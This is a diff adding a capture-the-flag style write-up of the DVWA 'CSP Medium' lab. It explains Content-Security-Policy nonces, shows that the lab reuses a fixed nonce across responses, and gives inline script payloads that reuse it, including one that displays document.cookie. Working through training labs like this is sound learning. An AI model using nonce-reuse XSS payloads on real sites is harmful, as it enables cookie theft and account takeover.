@@ -1,6 +1,75 @@
 #+TITLE: DVWA - CSP Medium
 #+AUTHOR: Leonardo Tamiano
 
-* TODO Description
-  CSP header now uses ~nonce~...  
-* TODO Solution
+* Description
+  In this medium challenge we have the following CSP header
+
+  #+begin_example
+$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+  #+end_example
+
+  Notice now that we have added the ~unsafe-inline~. This is used to
+  allow inline scripts and styles. We also have a ~nonce-source~
+  specified. This nonce must be generated using a cryptographically
+  secure random token generator and must change dynamically and be
+  unique for each HTTP request. Then, within the inline script, you
+  must specify it.
+
+  For example, upon th following HTTP response
+
+  #+begin_example
+Content-Security-Policy: script-src 'nonce-2726c7f26c'
+  #+end_example
+
+  We need to include the smae nonce in the script element
+
+  #+begin_src html
+<script nonce="2726c7f26c">
+  const inline = 1;
+  // …
+</script>
+  #+end_src
+  
+* Solution
+  The problem in this levle is that the nonce does not change as it
+  should per every request. This means that we can see the hard-coded
+  value given in the HTTP response
+
+  #+begin_example
+HTTP/1.1 200 OK
+Date: Sat, 11 Nov 2023 11:24:35 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
+X-XSS-Protection: 0
+Vary: Accept-Encoding
+Content-Length: 4220
+Connection: close
+Content-Type: text/html;charset=utf-8
+  #+end_example  
+
+  #+begin_example
+HTTP/1.1 200 OK
+Date: Sat, 11 Nov 2023 11:24:36 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
+X-XSS-Protection: 0
+Vary: Accept-Encoding
+Content-Length: 4220
+Connection: close
+Content-Type: text/html;charset=utf-8
+  #+end_example
+
+  Notice how the nonces do not change in the two responses. We can
+  therefore make the server execute any javascript code by including
+  the same nonce
+
+  #+begin_src html
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="> alert(1); </script>
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="> alert(document.cookie) </script>
+  #+end_src
